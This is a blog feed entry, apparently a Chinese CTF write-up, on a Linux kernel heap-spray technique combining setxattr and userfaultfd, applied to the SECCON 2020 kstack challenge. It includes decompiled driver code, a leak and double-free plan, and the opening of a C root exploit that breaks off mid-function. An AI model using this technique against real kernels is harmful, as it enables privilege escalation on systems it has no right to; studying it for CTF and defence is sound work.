<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2022-09-06T12:06:33.546Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kernel堆占位</title>
    <link href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/"/>
    <id>https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/</id>
    <published>2022-09-06T11:55:19.000Z</published>
    <updated>2022-09-06T12:06:33.546Z</updated>
    
    <content type="html"><![CDATA[<p>关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 <a href="https://cv196082.gitee.io/2022/08/16/userfaultfd/">https://cv196082.gitee.io/2022/08/16/userfaultfd/</a> </p><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p>setxattr这个系统调用是非常独特的，在kernel的利用中他可以为我们提供几乎任意大小的object分配。</p><p>setxattr的调用链如下：</p><p><code>SYS_setxattr()</code>=&gt;<code>path_setxattr()</code>=&gt;<code>setxattr()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function">  <span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> error;</span><br><span class="line">  <span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">  <span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">    error = -ERANGE;</span><br><span class="line">  <span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">      <span class="keyword">return</span> -E2BIG;</span><br><span class="line">    kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!kvalue)</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">      error = -EFAULT;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">        (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">      posix_acl_fix_xattr_from_user(mnt_userns, d_inode(d),</span><br><span class="line">                                    kvalue, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">  out:</span><br><span class="line">  kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我发现linux5.19版本里的setxattr函数的代码发生了变化，对于新版本的利用我还了解到比较少这里就不展开说了。可以看到上述代码中可以直接进行kvmalloc之后copy_from_user并且size和value都是我门可控的但是最后会free掉object。</p><h3 id="setxattr-amp-userfaultfd"><a href="#setxattr-amp-userfaultfd" class="headerlink" title="setxattr &amp; userfaultfd"></a>setxattr &amp; userfaultfd</h3><p>虽然我们可控一个object的内容，但是最后始终会free掉导致我们前功尽弃了。但是看过上一篇文章可以注意到在函数中会调用到copy_from_user从用户空间拷贝数据。那么我们可以产生下述想法：</p><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd 监视，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t016d23a8748e20bf24.png"                      alt="img"                ></p><p>上述就是 setxattr + userfaultfd的堆占位技术</p><h2 id="例题：SECCON-2020-kstack"><a href="#例题：SECCON-2020-kstack" class="headerlink" title="例题：SECCON 2020 kstack"></a>例题：SECCON 2020 kstack</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目开启保护有：smep，KPTI，kaslr</p><p>并且题目给的驱动模块只有一个ioctl函数可供利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">860</span>);</span><br><span class="line">v8 = kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">0x6000C0</span>LL); <span class="comment">// size:0x20</span></span><br><span class="line">*(_DWORD *)v8 = v4;</span><br><span class="line">v9 = head;</span><br><span class="line">head = v8;</span><br><span class="line">*(_QWORD *)(v8 + <span class="number">16</span>) = v9;</span><br><span class="line"><span class="keyword">if</span> ( !copy_from_user(v8 + <span class="number">8</span>, v3, <span class="number">8LL</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">head = *(_QWORD *)(v8 + <span class="number">16</span>);</span><br><span class="line">kfree(v8);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-22LL</span>;</span><br></pre></td></tr></table></figure><p>这里分配使用了<code>kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL);</code>，第二个参数是 flag ，为常规的 <code>GFP_KERNEL</code>这里可以暂且忽略。主要关注的是第一个参数，内核中有一个数组<code>kmalloc_caches</code>存放着<code>kmalloc_cache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4194304</span>, <span class="number">4</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8388608</span>, <span class="number">8</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16777216</span>, <span class="number">16</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">33554432</span>, <span class="number">32</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>kmem_caches[5]</code>对应的大小也就是32。然后这里object的前四个字节存放的内容为线程组的id。那么可以推测出结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">8</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">860</span>);</span><br><span class="line"><span class="keyword">if</span> ( a2 != <span class="number">0x57AC0001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x57AC0002</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5 = head;</span><br><span class="line">  <span class="keyword">if</span> ( !head )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == LODWORD(head-&gt;id) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_to_user(a3, &amp;head-&gt;data, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">      head = (struct node *)v5-&gt;prev;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (struct node *)head-&gt;prev;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( LODWORD(v6-&gt;id) != v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v6;</span><br><span class="line">        <span class="keyword">if</span> ( !v6-&gt;prev )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        v6 = (struct node *)v6-&gt;prev;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(a3, &amp;v6-&gt;data, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;prev = v6-&gt;prev;</span><br><span class="line">        LABEL_12:</span><br><span class="line">        kfree(v6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是上面这个功能，这里首先判断id是否等于当前进程的id如果是则取出数据，若果不是则开始进行循环查找，找到是当前进程id的object再读取数据。在读取出数据之后会进行脱链然后进行free操作。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>可以注意到上述代码中都没有锁的操作，所以这也为userfaultfd提供了可能性。</p><h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a><strong>leak</strong></h4><p>这里只可以读取<code>object+8</code>位置处的数据，这里选择的结构体为： <code>shm_file_data</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里ns位置存放的是kernel的.text段的地址。所以正好是可以泄漏出kernel地址。这里使用的办法就是先创建一个shm结构体随后释放掉，然后我们利用驱动申请一个object，使用userfaultfd阻止我们的数据写入到object中，然后在同一个线程读取出来内容。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a><strong>attack</strong></h4><p>后续的利用需要使用到double free，这里的double free不知道为什么是可以直接进行的不需要中间隔一个object，所以有清楚的师傅希望可以在评论区告诉我一下。最后就是使用<code>seq_operations</code>和<code>setxattr</code>进行劫持。在最后会用到堆占位的技术，即我们在setxattr中的copy_from_user时，我们只需要将前面0x8个字节的内容复制到<code>seq_operations</code>中，那么后续使用pt_regs进行稳定的拿到root shell。</p><p>对于pt_regs有疑问的可以看一下我前面文章中 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/#0CTF-2021-final-kernote">0CTF 2021 final kernote</a> 这道题的做法。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x57AC0001</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x57AC0002</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    